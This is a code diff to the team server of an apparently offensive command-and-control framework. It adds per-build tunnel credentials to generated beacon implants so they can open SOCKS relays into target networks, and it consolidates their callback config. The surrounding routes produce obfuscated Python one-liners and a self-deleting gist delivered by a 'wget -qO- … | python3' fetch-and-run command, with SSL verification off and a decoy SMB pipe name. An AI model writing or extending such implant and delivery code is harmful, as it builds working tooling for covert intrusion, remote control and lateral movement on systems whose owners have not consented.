@@ -239,6 +239,205 @@ def _load_state(data_dir: Path):
 
 # ── Beacon generator helpers ──
 
+# Where the tunnel server's key material lives, relative to the team
+# server's data directory.
+#
+# One file with two readers: the generator registers each build's PSK in
+# it, and the tunnel server reads its candidate PSKs out of it. `KeyStore`
+# is built for exactly that -- it re-reads the file whenever it is asked,
+# so a build registered here is accepted by a tunnel server that is
+# already running, and retiring one takes effect without a restart.
+_TUNNEL_KEYSTORE_RELPATH = ("tunnel", "keys.json")
+
+# How many random bytes a build's tunnel identity is made of.
+#
+# Random, and deliberately not `_assign_name`'s word list and counter.
+# That counter is saved only on the result and scan paths, so a team
+# server restarted after registering agents that never reported rewinds it
+# and hands out a name a previous host had. The tunnel identity is the key
+# of the SOCKS port table, and a port pinned to a name that rewound points
+# at a different network than the operator believes.
+_TUNNEL_IDENTITY_BYTES = 6
+
+
+def _tunnel_keystore_path(data_dir) -> Path:
+    """The one path the generator and the tunnel server share."""
+    return Path(data_dir).joinpath(*_TUNNEL_KEYSTORE_RELPATH)
+
+
+def _tunnel_config_for_build(body: dict, data_dir) -> Optional[dict]:
+    """The `tunnel` block for one generated build, or None for no tunnel.
+
+    One identity and one PSK per build, minted here and registered with
+    the tunnel server's `KeyStore` before the build goes out. Per build
+    because under `Noise_NKpsk0` the implant presents no static key, so
+    possession of the PSK plus the server's public key *is* the whole
+    credential: one PSK shared across every build would mean a single
+    captured implant lets anyone complete the handshake and claim any
+    identity. Per build also makes retiring a burned build a deletion of
+    its PSK rather than a rotation of everything.
+
+    The public key is read back out of the same store rather than taken
+    from the request, so a build cannot be issued with a key this
+    deployment will not present.
+
+    Returns None when the request asks for no tunnel, and raises
+    `ValueError` naming the field when it asks for one that cannot be
+    built. Nothing is registered in either case: a store littered with
+    PSKs no build holds is a candidate list every handshake has to walk.
+    """
+    # Imported here, not at the top: the container ships server.py and
+    # beacon.py side by side with no `tunnel` package beside them, and a
+    # deployment that generates no tunnel should not need one. `_PSK_LEN`
+    # and `_DEFAULT_KEEPALIVE` are read rather than repeated -- the store
+    # refuses a PSK of the wrong length, and the endpoint's own default is
+    # what a build with no explicit interval should get.
+    from software.c2.beacon import _DEFAULT_KEEPALIVE, tunnel_config_problem
+    from software.c2.tunnel.keys import _PSK_LEN, KeyStore
+
+    asked = body.get("tunnel") or {}
+    if not isinstance(asked, dict):
+        raise ValueError("tunnel must be an object, not %s"
+                         % type(asked).__name__)
+    if not asked.get("enabled"):
+        return None
+
+    for field in ("psk", "identity", "public_key"):
+        if asked.get(field):
+            raise ValueError(
+                "tunnel.%s cannot be supplied in the request: the PSK and "
+                "the identity are minted here, one per build, and the "
+                "public key is this deployment's own. A build carrying any "
+                "of them from elsewhere is one the tunnel server has not "
+                "registered." % field)
+
+    server = str(asked.get("server") or "").strip()
+    if not server:
+        raise ValueError(
+            "tunnel.server is required: it is the host the endpoint dials "
+            "out to, written as the target's network can reach it")
+    port = asked.get("port")
+    try:
+        port = 0 if isinstance(port, bool) else int(port)
+    except (TypeError, ValueError):
+        port = 0
+    if not 1 <= port <= 65535:
+        raise ValueError(
+            "tunnel.port must be a port between 1 and 65535: it is the "
+            "single port that serves the command channel and every relay")
+
+    # A store that cannot be opened or written is this deployment's
+    # problem and not the request's, so it is raised as something the
+    # routes answer 500 to. A 400 would tell the operator their request
+    # was wrong while the file named in the message says otherwise.
+    path = _tunnel_keystore_path(data_dir)
+    identity = "tun-" + os.urandom(_TUNNEL_IDENTITY_BYTES).hex()
+    psk = os.urandom(_PSK_LEN)
+    try:
+        store = KeyStore(path)
+        store.register_build(identity, psk)
+        public_key = base64.b64encode(store.static_public()).decode("ascii")
+    except (ValueError, OSError) as exc:
+        raise RuntimeError(
+            "the tunnel key store at %s could not be used, so no build can "
+            "be registered: %s" % (path, exc))
+
+    keepalive = asked.get("keepalive_seconds")
+    block = {
+        "enabled": True,
+        "server": server,
+        "port": port,
+        "public_key": public_key,
+        "psk": base64.b64encode(psk).decode("ascii"),
+        "identity": identity,
+        "keepalive_seconds": (keepalive if keepalive is not None
+                              else _DEFAULT_KEEPALIVE),
+        "allow_slow_crypto": bool(asked.get("allow_slow_crypto")),
+    }
+
+    # The same predicate the endpoint applies, asked here so that a build
+    # the endpoint would refuse is never delivered. If it fires, the
+    # credential that was just registered is taken back out again.
+    problem = tunnel_config_problem({"c2": {"tunnel": block}})
+    if problem:
+        store.retire_build(identity)
+        raise ValueError(problem)
+    return block
+
+
+def _beacon_gen_config(body: dict, protocols: dict, c2_url: str,
+                       data_dir) -> dict:
+    """The `gen_cfg` baked into one generated build.
+
+    Written once and called from both generator routes. The two used to
+    hold identical copies of this dictionary, and a key added to one of
+    them is the defect this repository keeps paying for --
+    `_beacon_config_block` and `_obfuscate_layer` were both hoisted out of
+    those same two routes for the same reason. The tunnel block is one
+    more fact that has to reach both.
+    """
+    https_cfg = protocols.get("https", {})
+    dns_cfg = protocols.get("dns", {})
+    smb_cfg = protocols.get("smb", {})
+    quic_cfg = protocols.get("quic", {})
+
+    return {
+        "https": {"enabled": bool(https_cfg.get("enabled")),
+                  "callback_url": https_cfg.get("callback_url", c2_url),
+                  "verify_ssl": False},
+        "dns": {"enabled": bool(dns_cfg.get("enabled")),
+                "domain": dns_cfg.get("domain", ""),
+                "resolver": dns_cfg.get("resolver", "8.8.8.8")},
+        "smb": {"enabled": bool(smb_cfg.get("enabled")),
+                "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
+                "server": smb_cfg.get("server", "")},
+        "quic": {"enabled": bool(quic_cfg.get("enabled")),
+                 "server": quic_cfg.get("server", "")},
+        "proxy": _proxy_config_from_body(body),
+        "c2_profile": _active_c2_profile or {},
+        # None when no tunnel was asked for. The bootstrap tests this key
+        # for truth, so a build without one is a plain beacon.
+        "tunnel": _tunnel_config_for_build(body, data_dir),
+    }
+
+
+def _log_generated_tunnel(gen_cfg: dict, event: str) -> str:
+    """Record which build was issued a tunnel; return its identity, or "".
+
+    The identity and nothing else. It is what an operator needs to find
+    the build's SOCKS port and to retire it later, and the PSK is what
+    they must never be handed back -- a credential in an event log or a
+    JSON response is a credential in a screenshot.
+    """
+    tunnel = gen_cfg.get("tunnel") or {}
+    identity = tunnel.get("identity") or ""
+    if identity:
+        _log_event(event, "Tunnel endpoint baked in: identity %s dialling "
+                          "%s:%d" % (identity, tunnel["server"],
+                                     tunnel["port"]))
+    return identity
+
+
+def _retire_generated_tunnel(gen_cfg: dict, data_dir) -> None:
+    """Undo a registration for a build that was never delivered.
+
+    The gist route registers the credential before `gh` has uploaded
+    anything, and an upload that fails leaves a PSK in the store that no
+    artifact holds. Every candidate in that file is tried on every
+    incoming handshake, so litter there is not free.
+    """
+    from software.c2.tunnel.keys import KeyStore
+
+    identity = (gen_cfg.get("tunnel") or {}).get("identity")
+    if not identity:
+        return
+    try:
+        KeyStore(_tunnel_keystore_path(data_dir)).retire_build(identity)
+    except (ValueError, OSError) as exc:
+        logger.warning("tunnel: could not retire undelivered build %s: %s",
+                       identity, exc)
+
+
 def _proxy_config_from_body(body: dict) -> dict:
     """Build the beacon's proxy config block from a generator request."""
     proxy = body.get("proxy") or {}
@@ -1178,31 +1377,17 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if not enc_key:
             enc_key = base64.b64encode(crypto._key).decode()
 
-        https_cfg = protocols.get("https", {})
-        dns_cfg = protocols.get("dns", {})
-        smb_cfg = protocols.get("smb", {})
-        quic_cfg = protocols.get("quic", {})
-
         beacon_path = Path(__file__).parent / "beacon.py"
         if not beacon_path.exists():
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
-        gen_cfg = {
-            "https": {"enabled": bool(https_cfg.get("enabled")),
-                      "callback_url": https_cfg.get("callback_url", c2_url),
-                      "verify_ssl": False},
-            "dns": {"enabled": bool(dns_cfg.get("enabled")),
-                    "domain": dns_cfg.get("domain", ""),
-                    "resolver": dns_cfg.get("resolver", "8.8.8.8")},
-            "smb": {"enabled": bool(smb_cfg.get("enabled")),
-                    "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
-                    "server": smb_cfg.get("server", "")},
-            "quic": {"enabled": bool(quic_cfg.get("enabled")),
-                     "server": quic_cfg.get("server", "")},
-            "proxy": _proxy_config_from_body(body),
-            "c2_profile": _active_c2_profile or {},
-        }
+        try:
+            gen_cfg = _beacon_gen_config(body, protocols, c2_url, data_dir)
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+        except RuntimeError as exc:
+            return jsonify({"error": str(exc)}), 500
         config_block = _beacon_config_block(gen_cfg, interval, jitter, enc_key)
 
         payload = src + "\n" + config_block
@@ -1225,6 +1410,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         oneliner_unix = f"python3 -c '{stage}'"
         oneliner_win = f'python -c "{stage}"'
         _log_event("BEACON-GEN", f"Generated obfuscated beacon ({layers} layers) for {c2_url}")
+        tunnel_identity = _log_generated_tunnel(gen_cfg, "BEACON-GEN")
 
         return jsonify({
             "oneliner_unix": oneliner_unix,
@@ -1234,6 +1420,10 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "size": len(stage),
             "raw_size": len(payload),
             "deob": list(reversed(deob_layers)),
+            # Which build this is, so the operator can find its SOCKS port
+            # and retire it later. Never the PSK: the credential leaves
+            # this process once, into the artifact.
+            "tunnel_identity": tunnel_identity,
         })
 
     # ── Beacon gist delivery ──
@@ -1265,31 +1455,17 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         if not enc_key:
             enc_key = base64.b64encode(crypto._key).decode()
 
-        https_cfg = protocols.get("https", {})
-        dns_cfg = protocols.get("dns", {})
-        smb_cfg = protocols.get("smb", {})
-        quic_cfg = protocols.get("quic", {})
-
         beacon_path = Path(__file__).parent / "beacon.py"
         if not beacon_path.exists():
             return jsonify({"error": "beacon.py not found"}), 500
         src = beacon_path.read_text(encoding="utf-8")
 
-        gen_cfg = {
-            "https": {"enabled": bool(https_cfg.get("enabled")),
-                      "callback_url": https_cfg.get("callback_url", c2_url),
-                      "verify_ssl": False},
-            "dns": {"enabled": bool(dns_cfg.get("enabled")),
-                    "domain": dns_cfg.get("domain", ""),
-                    "resolver": dns_cfg.get("resolver", "8.8.8.8")},
-            "smb": {"enabled": bool(smb_cfg.get("enabled")),
-                    "pipe_name": smb_cfg.get("pipe_name", "msrpc_6e2f"),
-                    "server": smb_cfg.get("server", "")},
-            "quic": {"enabled": bool(quic_cfg.get("enabled")),
-                     "server": quic_cfg.get("server", "")},
-            "proxy": _proxy_config_from_body(body),
-            "c2_profile": _active_c2_profile or {},
-        }
+        try:
+            gen_cfg = _beacon_gen_config(body, protocols, c2_url, data_dir)
+        except ValueError as exc:
+            return jsonify({"error": str(exc)}), 400
+        except RuntimeError as exc:
+            return jsonify({"error": str(exc)}), 500
         config_block = _beacon_config_block(gen_cfg, interval, jitter, enc_key)
 
         payload = src + "\n" + config_block
@@ -1315,6 +1491,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             os.unlink(tmp.name)
 
         if r.returncode != 0:
+            _retire_generated_tunnel(gen_cfg, data_dir)
             return jsonify({"error": f"gh gist create failed: {r.stderr.strip()}"}), 500
 
         gist_url = r.stdout.strip()
@@ -1346,6 +1523,7 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
         oneliner_wget = f"wget -qO- '{raw_url}'|python3"
 
         _log_event("BEACON-GIST", f"Created gist {gist_id} for {c2_url} (auto-delete on connect)")
+        tunnel_identity = _log_generated_tunnel(gen_cfg, "BEACON-GIST")
 
         return jsonify({
             "gist_id": gist_id,
@@ -1357,6 +1535,8 @@ def create_app(crypto: ServerCrypto, operator_token: str, data_dir: Path,
             "oneliner_wget": oneliner_wget,
             "layers": layers,
             "size": len(stage),
+            # As in the other route: the identity, never the PSK.
+            "tunnel_identity": tunnel_identity,
         })
 
     @app.route("/api/server/beacon-gist/<gist_id>", methods=["DELETE"])
